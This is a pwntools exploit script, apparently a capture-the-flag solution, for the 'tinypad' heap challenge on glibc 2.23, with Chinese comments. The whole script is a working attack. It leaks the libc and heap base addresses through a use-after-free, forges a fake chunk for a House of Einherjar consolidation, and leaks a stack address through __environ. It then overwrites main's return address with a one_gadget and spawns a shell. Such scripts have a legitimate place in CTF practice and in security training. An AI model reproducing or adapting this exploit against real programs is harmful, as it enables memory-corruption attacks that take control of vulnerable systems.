from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '85'])
p = process('./tinypad')
libc = ELF('./libc-2.23.so')

def create(size, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('A')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)

def delete(index):
    p.recvuntil('(CMD)>>> ')
    p.sendline('D')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(index))

def edit(index, content, choice=b'Y'):
    p.recvuntil('(CMD)>>> ')
    p.sendline('E')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(index))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil('(Y/n)>>> ')
    p.sendline(choice)

tinypad     = 0x602040

create(0x80, b'a')
create(0x80, b'a')
create(0x80, b'a')
create(0x100, b'a' * (0x60-1))

# 通过UAF泄露libc基地址
delete(3)   # 下一步需要泄露heap，所以这一步先释放3，因为1是heap基址最低为是0x00，因此泄露heap是需要泄露3的地址然后计算1
p.recvuntil(' #   INDEX: 3')
p.recvuntil('# CONTENT: ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 3951480
environ     = libc_base + libc.symbols['__environ'] # __environ存放着栈的地址
one_gadget  = libc_base + 0xf1247
print('libc_base基地址为:' + hex(libc_base))

# 泄露heap基地址
delete(1)   # 1:fd -> 3
p.recvuntil(' #   INDEX: 1')
p.recvuntil('# CONTENT: ')
heap_base = u64(p.recv(4).ljust(8, b'\x00')) - 288
print('heap基地址为:' + hex(heap_base))

delete(2) # 此时chunk123全为free，只有chunk4用于占位防止top chunk合并
# 用chunk1和chunk2进行向前合并到tinypad
create(0x10, b'a')  # 0x20
create(0xf0, b'a')  # 0x100

for i in range(7):  # 最高位置空
    delete(1)
    create(0x10+8, b'a' * (24 - i))
delete(1)
create(0x10+8, b'a' * 16 + p64(heap_base + 0x20 - (tinypad + 0x50))) # 修改chunk2的prev_size和size的inuse位

# 在tiny+0x50处伪造fake chunk
payload = b'a' * 8 + p64(heap_base + 0x20 - (tinypad + 0x50) + 1)
payload += p64(tinypad + 0x50) + p64(tinypad + 0x50)
for i in range(0x20):
    create(0x100, b'a' * (0x20 - i + 0x50) + payload[0x20-i:0x20])
    edit(3, b'a' * (0x20 - i + 0x50) + payload[0x20-i:0x20])
    delete(3)

# 触发house of einherjar
delete(2)

# 泄露栈地址
payload = b'a' * 8 + p64(0x100)
for i in range(6):  # 最高位置空
    edit(4, b'a' * 0x58 +b'a' * (8 - (i + 1)))
edit(4, b'a' * 0x50 + payload)
payload = b'a' * (0xA0 + 8)
payload += p64(environ) + p64(0x10) + p64(tinypad + 0x100)
create(0x100 - 0x10, payload) # 将tiny1写入environ的地址

p.recvuntil(' #   INDEX: 1')
p.recvuntil('# CONTENT: ')
stack = u64(p.recv(6).ljust(8, b'\x00'))
ret   = stack + (0x7ffe7da472f8 - 0x7ffe7da473e8)
print('栈地址为:' + hex(stack))

# 将tiny1写入main的返回地址
payload = b'a' * 8
payload += p64(ret)
edit(2, payload)
edit(1, p64(one_gadget))    # 将main的返回地址写入one_gadget

# gdb.attach(p)

p.recvuntil('(CMD)>>> ')
p.sendline('Q')             # 触发one_gadget
p.interactive()



